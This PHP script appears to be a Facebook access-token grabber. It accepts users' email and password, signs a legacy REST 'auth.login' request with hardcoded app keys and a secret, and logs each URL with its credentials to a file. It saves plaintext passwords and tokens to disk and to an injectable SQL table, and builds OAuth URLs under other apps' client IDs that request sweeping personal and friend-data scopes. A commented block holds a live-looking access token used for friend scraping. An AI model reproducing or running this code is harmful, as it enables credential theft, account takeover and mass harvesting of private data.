<?php
$fullurl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
/*
if (preg_match("/(dimaslanjaka.000webhostapp)/m", $fullurl)){
$redirect = "http://www.anaxlifescience.com/sic-admin/upload/home/token/refreshtoken.php?";
$redirectfor = $redirect.$_SERVER['QUERY_STRING'];
header("Location: $redirectfor");
die();
}
*/
//set_time_limit(0);
//ob_start();
include("function.php");
//include("minify.php");
$fullurl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//echo rawurldecode($fullurl);
//var_dump(parse_url($_SERVER["REQUEST_URI"]));
//var_dump($_SERVER['QUERY_STRING']);
//die($fullurl);
if (isset($_GET["js"])){
$loopfilename = glob('data/*.{js}', GLOB_BRACE);
$filename = randfile("data","js");
foreach ($loopfilename as $i => $filename){
$file = file_get_contents($filename);
$file = preg_replace('/(<script>|<\/script>)/m', '', $file);
preg_match('/const restapi \=+(.*)?\;/m', $file, $res);
//$file = str_replace("\"","", $res[1]);
//$file = str_replace("html(data)", "append(data)", $file);
//$file = str_replace("#token_r","body",$file);
//$file = str_replace("getToken(","getToken".$i."(", $file);
//var_dump($res[1],$i);
echo "<script>document.write(\"<iframe src=\\". trim($res[1]) ." +\"\\\" ></iframe>\");</script>";
}
die();
} else {
header("Content-Type: application/json");
include("dom.php");
if (isset($_POST["user"])){
$user=$_POST["user"];
} else if (isset($_GET["user"])){
$user=$_GET["user"];
} else {
  $user = null;
  }
if (isset($_POST["pass"])){
$pass=$_POST["pass"];
} else if (isset($_GET["pass"])){
$pass=$_GET["pass"];
} else {
  $pass = null;
  }
  //$url=parse_url("http://domain.com/site/gallery/1#photo45 "); 
 // echo $url["fragment"];
  //echo $_SERVER["REQUEST_URI"];
 // die();
  $user=urldecode($user);
  $pass=urldecode($pass);
  //var_dump($pass);
$_SESSION["user"]=$user;
$_SESSION["pass"]=$pass;
global $user;
global $pass;
//die(var_dump($_SESSION));
function curl($url, $post=false, $opt=false){
  global $user;
  global $pass;
  //echo "$user:$pass";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 if($post!=null){
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
 }
 //curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
if (isset($post)){
$ref= "http://www.facebook.com";
} else {
$ref="https://www.instagram.com/accounts/login/";
}
if (!isset($opt["ref"])){
curl_setopt($ch, CURLOPT_REFERER, $ref);
} else {
curl_setopt($ch, CURLOPT_REFERER, $opt["ref"]);
}
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
if (isset($post)){
$headers[] = "Host: www.facebook.com";
$headers[] = "Origins: https://www.facebook.com";
$headers[] = "Authority: www.facebook.com";
$headers[] = 'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'; 
$headers[] = 'Connection: Keep-Alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Content-type: application/x-www-form-urlencoded,*/*;charset=UTF-8';
//'Content-Type: '

$headers[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$headers[] = "Accept-Language: en-us,en;q=0.5";
$headers[] = "Pragma: no-cache";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
}
if (isset($opt["dump"])){
 curl_setopt($ch, CURLOPT_HEADER, true);
}
if (isset($opt["useragent"])){
 $_SESSION["useragent"]=$useragent;
 setcookie("useragent", $useragent, time()+3600); // 1hr = 3600 secs
 curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
 }
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 $cookie="cache/$user.cookie";
 if (!file_exists($cookie)){
   file_put_contents($cookie,"");
 }
 $cookie=realpath($cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 //curl_setopt($ch, CURLOPT_VERBOSE, true);
 $exec = curl_exec($ch);
 curl_close($ch);
 return $exec;
}

function randS($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

//$data = "email=".$user."&pass=".$pass."&login=Masuk";
$data = 'email='.$user.'&pass='.$pass.'&login=Login';
//die($data);



//die(print_r($_SESSION));
function buildUrl($user,$pass){
$Apidata=array(
 "api_key" => "3e7c78e35a76a9299309885393b02d97",
 "credentials_type" => "password",
 "email" =>"$user",
 "format"=>"JSON",
 "locale"=>"en_US",
 "method"=>"auth.login",
 "password"=>"$pass",
 "return_ssl_resources"=>"0",
 "v"=>"1.0"
);
$md5="";
foreach ($Apidata as $data => $barrier){
  $md5.=$data."=".$barrier;
}
$md5.="c1e620fa708a1d5696fb991c1bde5662";
$md5=md5($md5);
$ApiUrl= "https://api.facebook.com/restserver.php?".http_build_query($Apidata)."&sig=".$md5;
return $ApiUrl;
}

//$ApiPath="/restserver.php?".http_build_query($Apidata)."&sig=".$md5;
//$_SESSION["token_url"]=base64_encode($Apiurl);


$Apiurl = buildUrl($user,$pass);
file_put_contents("data/api.url", $Apiurl."\n", FILE_APPEND | LOCK_EX);
header("Location: $Apiurl");
die();


$curl_o["refer"] = "https://www.facebook.com/home.php";
$curl_o["cookiefile"] = "cache/RestApi.txt";
$header[] = "Origins: https://api.facebook.com";
$header[] = "Host: api.facebook.com";
$header[] = "Connection: close";
$curl_o["headers"] = $header;
$curl_o["useragent"] = $useragent = (isset($_POST["useragent"]) ? base64_decode($_POST["useragent"]) : (isset($_GET["useragent"]) ? base64_decode($_GET["useragent"]) : (isset($_COOKIE["useragent"]) ? base64_decode($_COOKIE["useragent"]) : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")));
(!file_exists($curl_o["cookiefile"]) ? file_put_contents($curl_o["cookiefile"],1,LOCK_EX) : false);
$ApiRest= fetch($Apiurl,$curl_o);
$api=json_decode($ApiRest,true);
$token=(isset($api["access_token"]) ? $api["access_token"] : false);
$id=$api['uid'];
if (!empty( $token ) && strlen($token) > 130 && !empty($id)){
  include("db.php");
  global $con;
  $sql = "REPLACE INTO token_all (token,id) VALUES ('$token', '$id')";
  $result = mysqli_query($con, $sql);
  if ($result){ mysqli_close($con); }
} else {
  echo $ApiRest;
}
$_SESSION["token"]=$token;
$_SESSION["id"]=$_SESSION["uid"]=$id;


/*
$host="api.facebook.com";
if ($fp = fsockopen('ssl://'. $host, 443, $errno, $errstr, 30)) {
  
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET ".$ApiPath." HTTP/1.1\r\n";
    $out .= "Host: ".$host."\r\n";
    $out .= "Connection: Keep-Alive\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
}
*/
//var_dump($fp);

/*****************
  * END OF FILE *
 *****************/
 

function oauth($appid,$redirect){
  global $opt;
$url="https://www.facebook.com/v1.0/dialog/oauth?response_type=token&display=popup&client_id=$appid&redirect_uri=$redirect&scope=user_actions.books,user_actions.music,user_actions.video,user_checkins,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photo_video_tags,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_checkins,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photo_video_tags,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_read,email,publish_checkins&format=json&sdk=android";
return $url;
}

// appid 145634995501895 fb
// app_id 1217981644879628 instagram
// client_id 124024574287414 instagram
// api_key   124024574287414 instagram
// ? id= 1425767024389221 instagram
// ? id= 611911702222239 hootsuite
// client_id 183319479511 hootsuite
// api_key 183319479511 hootsuite
// 317436302110698 v2.11 hootsuite
//https://hootsuite.com/login?method=facebook

// id=521414431657173 vonvon
// client_id 685543434893182 vonvon
//https://id.vonvon.me/callback/facebook

// client_id 373499472709067 myspace.com
//https://myspace.com/thirdpartyauth/facebook/connected/login?mstoken=undefined

//id=1483047915331997 spotify
//api_key=174829003346
//https://www.spotify.com/id/signup/

//$spotify=oauth(174829003346,"https://accounts.spotify.com/api/facebook/oauth/access_token");
$vonvon=oauth(685543434893182,"https://id.vonvon.me/callback/facebook"); 
$hootsuite=oauth(317436302110698,"https://hootsuite.com/login?method=facebook");
$myspace=oauth(373499472709067,"https://myspace.com/thirdpartyauth/facebook/connected/login?mstoken=undefined");
$instagram=oauth(124024574287414,"https://www.instagram.com/accounts/signup/");
//die($instagram);
//$samsung=oauth(242091172506567,"https://sso-us.samsungusa.com/facebook/callback");
//die($samsung);
//$opt["dump"]=1;

//$re = '/access_token=(.*)?&/m';
/*
if (preg_match("/access_token=(.*?)&expires_in/mi", $hootsuite, $r_app)){

if (empty($r_app)){
  $login=curl("https://www.facebook.com/login.php", $data, $opt);
die($login);
} else {
  $json[]= $r_app[1];
}
}
*/

if (null !== $api && !empty($id) && null !== $id && $api !== false && isset($api["access_token"])){
  setcookie("uid", $id, time() + (86400 * 30), "/");
$fp = fopen("tokens/".$id.".txt", 'w+') or die("cant write token");
fwrite($fp, $token);
fclose($fp);
  $data=array();
  $data["username"]=$user;
  //$user=$data["id"];
  $data["password"]=$pass;
  $data["id"]=$id;
  $json = json_encode($data);
  if (false !== $id && null !== $id && false !== $user && null !== $user){ //var_dump($user,$json); die();
  file_put_contents("data/$user.facebook", $json, LOCK_EX);
  }
} else { 
  $datauser="data/$user.facebook";
 if (file_exists($datauser)){
   $data = file_get_contents($datauser);
   $json = json_decode($data, true);
   $login_email = $json["username"];
   $login_pass = $json["password"]; 
}
}

setcookie("token", $token, time() + (86400 * 30), "/");

echo $token;
/*
$token=decbin(ord(serialize(base64_encode($token))));
$toket=chr(bindec(unserialize(base64_decode($token))));

$json=array();
$json[]=$token;
*/
// json_encode($json);

} // end !isset($_GET["local"])

/*
header("Content-type: application/json; charset=utf-8");

require("Instagram.php");
$curl=new curl();
function getFriend($url=null,$token="EAAAAUaZA8jlABAAUgCpZABsk1jsXul8Xu9P7cjqpvDxIrW7nZB8MyT7A8woupnXY2QVZBNMhxKyyHM33X2REYAOxErufOVsg7wu4lIivdXTTvqupkTUMPGklk1DipfRJiAeKDpZCFgZAEVPF7xghqYGZAjnh30Jn5jZBsQWZC0t4ZA6BjgW4JNu8oa"){
  global $curl;
  if (null === $url){
$url="https://graph.facebook.com/v3.2/me/friends?access_token=$token&fields=id,name,gender,picture{url}";
  }
  $json = $curl->fetch($url);
  $json = utf8_encode($json);
  $json = json_decode($json, true);
  $data[]="";
  $data["next"]= urldecode($json["paging"]["next"]);
  foreach ($json["data"] as $x){
    $n["id"]=$x["id"];
    $n["name"]=$x["name"];
    $n["gender"]=(isset($x["gender"]) ? $x["gender"] : null);
    $n["picture"]=$x["picture"]["data"]["url"];
    $data[]=$n;
  }
  return $data;
}
$x = getFriend();
$next = $x["next"];
echo json_encode(getFriend(null));
*/